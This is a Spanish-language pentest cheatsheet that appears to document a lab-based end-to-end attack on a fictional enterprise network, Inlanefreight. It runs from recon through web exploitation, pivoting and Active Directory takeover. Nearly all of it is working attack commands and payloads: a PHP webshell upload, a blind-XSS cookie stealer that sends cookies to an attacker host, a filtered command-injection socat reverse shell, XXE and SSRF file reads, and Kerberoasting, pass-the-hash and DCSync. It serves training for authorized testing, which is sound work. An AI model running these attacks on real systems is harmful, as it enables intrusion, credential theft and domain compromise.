---
title: "Attacking Enterprise Networks"
description: "Workflow end-to-end de pentest empresarial."
sidebar:
  order: 2
  label: "Attacking Enterprise Networks"
---
> Módulo capstone del path CPTS. Simula un pentest externo + interno completo contra Inlanefreight. Integra todos los módulos previos en una cadena de ataque end-to-end: external recon → web exploitation → foothold → pivoting → AD compromise.

---


## Fase 1 — External Recon

### Nmap inicial

```bash
# Quick scan (top 1000)
sudo nmap --open -oA target_tcp_1k -iL scope

# Full scan con detección de servicios
sudo nmap --open -p- -A -oA target_tcp_all_svc -iL scope

# Extraer servicios únicos del .gnmap
egrep -v "^#|Status: Up" target_tcp_all_svc.gnmap | cut -d ' ' -f4- | tr ',' '\n' | \
  sed -e 's/^[ \t]*//' | awk -F '/' '{print $7}' | grep -v "^$" | sort | uniq -c | sort -k 1 -nr
```

### DNS Zone Transfer

```bash
dig axfr DOMAIN.local @TARGET_IP
# Si falla → brute force de subdominios
```

### vHost fuzzing con ffuf

```bash
# 1. Determinar tamaño de respuesta inválida
curl -s -I http://TARGET_IP -H "HOST: defnotvalid.domain.local" | grep "Content-Length:"
# → anota el tamaño (ej: 15157)

# 2. Fuzzear vhosts filtrando por ese tamaño
ffuf -w /opt/useful/seclists/Discovery/DNS/namelist.txt:FUZZ \
  -u http://TARGET_IP/ \
  -H 'Host:FUZZ.domain.local' \
  -fs 15157

# 3. Añadir todos al /etc/hosts
sudo tee -a /etc/hosts > /dev/null <<EOT
TARGET_IP domain.local sub1.domain.local sub2.domain.local sub3.domain.local
EOT
```

---

## Fase 2 — Service Enumeration

### FTP

```bash
ftp TARGET_IP        # probar: anonymous (blank password)
ftp> ls              # listar archivos
ftp> put test.txt    # testear write access
# vsftpd 3.0.3 → único exploit conocido es DoS (out of scope)
```

### SMTP — User Enumeration

```bash
telnet TARGET_IP 25
VRFY root            # 252 = existe | 550 = no existe

# Automatizar con smtp-user-enum
smtp-user-enum -M VRFY -U /opt/useful/seclists/Usernames/xato-net-10-million-usernames.txt \
  -t TARGET_IP

# Comprobar Open Relay
nmap -p25 -Pn --script smtp-open-relay TARGET_IP
```

### rpcbind

```bash
rpcinfo TARGET_IP    # enumerar servicios RPC
# → Low finding: servicio innecesario expuesto externamente
```

---

## Fase 3 — Web Enumeration

### EyeWitness (screenshot de todas las apps)

```bash
# Crear lista de subdominios
cat subdomains.txt  # uno por línea

eyewitness -f subdomains.txt -d CLIENTE_subdomain_EyeWitness
# → revisar el report HTML para priorizar targets
```

### Directory brute-force (Gobuster)

```bash
gobuster dir -u http://TARGET/ \
  -w /usr/share/wordlists/dirb/common.txt \
  -x .php -t 300

# Interpretar codes:
# 200 → existe y accesible
# 301/302 → redirect (seguir)
# 403 → existe pero forbidden (reportar y probar bypass)
```

---

## Fase 4 — Web Exploitation

### File Upload + HTTP Verb Tampering (dev.domain.local)

```bash
# 1. Descubrir métodos permitidos
curl -s -I -X OPTIONS http://dev.domain.local/upload.php

# 2. Usar TRACK + X-Custom-IP-Authorization header para bypass
# En Burp Repeater:
# Method: TRACK
# Header: X-Custom-IP-Authorization: 127.0.0.1
# → response muestra el formulario de upload

# 3. Subir webshell como imagen (bypass Content-Type)
# Content-Type: image/png ← cambiar en Burp
# Filename: random_hash.php
# Content: <?php system($_GET['cmd']); ?>

# 4. Ejecutar
curl "http://dev.domain.local/uploads/HASH.php?cmd=id"
```

### WordPress — enum + brute + shell

```bash
# Enumerar versión y plugins
sudo wpscan -e ap -t 500 --url http://wp.domain.local

# Enumerar usuarios
wpscan -e u -t 500 --url http://wp.domain.local

# Brute force contraseñas
wpscan --url http://wp.domain.local \
  -P /opt/useful/seclists/Passwords/Common-Credentials/darkweb2017_top-100.txt \
  -U ilfreightwp

# → Login → wp-admin → Theme Editor → 404.php (tema inactivo) → webshell
# URL: /wp-admin/theme-editor.php?file=404.php&theme=twentytwenty
```

### SQLi manual + sqlmap (status.domain.local)

```sql
-- Test básico
'
-- UNION payload
' union select null, database(), user(), @@version -- //
```

```bash
# sqlmap con request capturado de Burp (marcar parámetro con *)
sqlmap -r sqli.txt --dbms=mysql
sqlmap -r sqli.txt --dbms=mysql --dbs
sqlmap -r sqli.txt --dbms=mysql -D STATUS_DB --tables
sqlmap -r sqli.txt --dbms=mysql -D STATUS_DB -T users --dump
```

### LFI en plugin WordPress (mail-masta 1.0)

```bash
curl "http://wp.domain.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd"
```

### XSS blind → Session Hijacking (support.domain.local)

```bash
# 1. Crear index.php (logger de cookies)
cat > index.php << 'EOF'
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
EOF

# 2. Crear script.js
echo "new Image().src='http://OUR_IP:9200/index.php?c='+document.cookie" > script.js

# 3. Levantar servidor PHP
sudo php -S 0.0.0.0:9200

# 4. Payload en el ticket/comentario:
# "><script src=http://OUR_IP:9200/script.js></script>

# 5. Usar la cookie robada con Cookie-Editor (Firefox extension)
```

### SSRF via HTML Injection en PDF generator (tracking.domain.local)

```javascript
// Payload para local file read vía XHR en PDF
<script>
x=new XMLHttpRequest;
x.onload=function(){
document.write(this.responseText)};
x.open("GET","file:///etc/passwd");
x.send();
</script>
```

### XXE Injection (shopdev2.domain.local)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE userid [
  <!ENTITY xxetest SYSTEM "file:///etc/passwd">
]>
<root>
    <subtotal>undefined</subtotal>
    <userid>&xxetest;</userid>
</root>
```

### GitLab abierto → descubrir vhosts internos

```bash
# 1. Registrar cuenta → /explore → ver proyectos públicos
# 2. Revisar repos por: config files, SSH keys, passwords, nuevos hostnames
# 3. Añadir subdominios descubiertos al /etc/hosts y continuar enumeración
```

### Hydra — brute force HTTP form (monitoring.domain.local)

```bash
hydra -l admin -P passwords.txt monitoring.domain.local \
  http-post-form "/login.php:username=admin&password=^PASS^:Invalid Credentials!"
```

### Command Injection con filtros (monitoring.domain.local)

```bash
# Bypass de filtro: newline (%0A) + single quotes + ${IFS}
curl "http://monitoring.domain.local/ping.php?ip=127.0.0.1%0a'i'd"
# → uid=1004(webdev)

# Socat reverse shell (cuando nc/curl/wget están filtrados)
# Verificar que socat existe:
curl "http://monitoring.domain.local/ping.php?ip=127.0.0.1%0a'w'h'i'ch${IFS}socat"

# Listener en Kali:
nc -nvlp 8443

# Payload en Burp (GET request):
GET /ping.php?ip=127.0.0.1%0a's'o'c'a't'${IFS}TCP4:OUR_IP:8443${IFS}EXEC:bash HTTP/1.1
```

---

## Fase 5 — Foothold & Upgrade de Shell

### Socat TTY interactiva completa

```bash
# En Kali (listener TTY completo):
socat file:`tty`,raw,echo=0 tcp-listen:4443

# En el target (desde reverse shell básica):
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:OUR_IP:4443
```

### adm group → credential hunting en audit logs

```bash
# Si el usuario está en el grupo adm → leer audit logs
id | grep adm

# Extraer TTY keystroke logging (buscando creds)
aureport --tty | less
# → Buscar: contraseñas tecleadas en comandos su, sudo

# También revisar:
cat /var/log/auth.log | grep -i "password\|login"
```

---

## Fase 6 — Pivoting al interior

```bash
# Verificar IPs del host comprometido
hostname -I
ifconfig

# Setup de túnel (desde el host DMZ → red interna)
# Opción 1: Chisel
# En Kali:
./chisel server -p 8080 --reverse

# En target:
./chisel client OUR_IP:8080 R:socks

# Configurar proxychains: socks5 127.0.0.1 1080
# Opción 2: ligolo-ng (ver [Pivoting, Tunneling, and Port Forwarding](/metodologias/pivoting/pivoting-tunneling-port-forwarding/))

# Escanear red interna a través del túnel
proxychains nmap -sT -p 22,80,445,3389,5985 172.16.8.0/23 --open
```

---

## Fase 7 — Internal AD Enumeration & Attacks

### Enumeración inicial

```bash
# CME — identificar hosts y usuarios
proxychains crackmapexec smb 172.16.8.0/23 --gen-relay-list smb_hosts.txt

# BloodHound
proxychains bloodhound-python -u USER -p PASS \
  -d DOMAIN.LOCAL -ns DC_IP -c All

# BloodHound queries clave:
# - Shortest Paths to Domain Admins
# - Kerberoastable Users
# - AS-REP Roastable Users
# - Find All Paths from X to Domain Admin
```

### Kerberoasting

```bash
proxychains GetUserSPNs.py DOMAIN/user:pass -dc-ip DC_IP -request
hashcat -m 13100 tgs.hash /usr/share/wordlists/rockyou.txt
```

### Pass-the-Hash / Pass-the-Ticket

```bash
# PTH con CME
proxychains crackmapexec smb TARGET -u Admin -H HASH

# PTT con Rubeus (en Windows)
.\Rubeus.exe dump /luid:0x1a8b19 /service:krbtgt
.\Rubeus.exe ptt /ticket:BASE64_TICKET
klist
```

### DCSync → Domain Compromise

```bash
# Con Mimikatz (en Windows)
lsadump::dcsync /user:DOMAIN\Administrator

# Con secretsdump (en Kali, vía proxychains)
proxychains secretsdump.py DOMAIN/Administrator@DC_IP \
  -hashes :HASH -just-dc-ntlm
```

---

## Mapa de findings típicos External PT

| Finding | Severity | Fuente |
|---------|----------|--------|
| FTP Anonymous Login | Medium | FTP |
| SMTP VRFY User Enum | Low | SMTP |
| rpcbind expuesto | Low | rpcbind/111 |
| HTTP Verb Tampering | High | dev.app/upload |
| Unrestricted File Upload | High | dev.app/upload |
| LFI WordPress (mail-masta) | High | WordPress plugin |
| Weak WordPress Credentials | High | WordPress |
| IDOR | Medium | careers.app |
| SQL Injection | High | status.app |
| XSS Blind → Session Hijack | High | support.app |
| SSRF → Local File Read | High | tracking.app |
| GitLab misconfigured | High | gitlab.app |
| XXE Injection | High | shopdev2.app |
| Command Injection | Critical | monitoring.app |
| Directory Listing Enabled | Low | dev.app/uploads |
| Drupal no hardened (unused) | Informational | blog.app |
| Unnecessary exposed services | Low | rpcbind, smtp |

---

## Pitfalls / Gotchas

- **EyeWitness antes que manual:** en scope grande, EyeWitness ahorra horas. Revisarlo completo antes de ir app por app.
- **GitLab como fuente de vhosts:** los repos públicos pueden revelar hostnames internos no encontrados por DNS/ffuf.
- **Content-Type bypass en uploads:** cambiar solo el Content-Type header en Burp puede ser suficiente si la validación es client-side.
- **Command injection con filtros:** siempre leer el código de filtro si puedes (LFI, file read). Ahorra mucho tiempo de adivinación.
- **socat vs nc:** cuando `nc`, `curl`, `wget` están bloqueados por el filtro, `socat` suele estar presente. También `python3 -c`.
- **adm group → audit logs:** siempre verificar grupos del usuario tras foothold. `adm` = acceso a `/var/log` completo.
- **aureport:** cuando el usuario tiene acceso a audit logs, los TTY keystroke logs pueden contener contraseñas tecleadas por otros usuarios.
- **Scope creep en External PT:** no profundizar en vulnerabilidades menores (headers HTTP, missing flags en cookies) a menos que no haya findings serios. Priorizar RCE y data exposure.
- **Phishing out of scope por defecto:** confirmarlo en el SoW. No asumir que está permitido.
- **DoS de vsFTPd:** el único CVE conocido es DoS — siempre out of scope. No intentar.
- **DNS zone transfer primero:** antes de ffuf, siempre intentar zone transfer. Más rápido y completo.
- **Medir eficiencia:** automation es buena solo si capturas todo. Spot-check los resultados de herramientas automáticas.

---

## Cheatsheets relacionados

- [Network Enumeration with Nmap](/metodologias/recon/network-enumeration-nmap/) — scans externos iniciales
- [Information Gathering - Web Edition](/metodologias/recon/information-gathering-web/) — subdominios, vhosts
- [Attacking Common Applications](/metodologias/web/attacking-common-applications/) — WordPress, GitLab, Tomcat
- [Command Injections](/metodologias/web/command-injections/) — bypass de filtros, evasión
- [File Upload Attacks](/metodologias/web/file-upload-attacks/) — content-type bypass, polyglots
- [Web Attacks](/metodologias/web/web-attacks/) — XXE, IDOR, HTTP verb tampering
- [Pivoting, Tunneling, and Port Forwarding](/metodologias/pivoting/pivoting-tunneling-port-forwarding/) — pivoting al interior
- [Active Directory Enumeration & Attacks](/metodologias/active-directory/active-directory-enumeration-attacks/) — fase interna
- [Documentation & Reporting](/metodologias/fundamentos/documentation-reporting/) — documentar todo el engagement
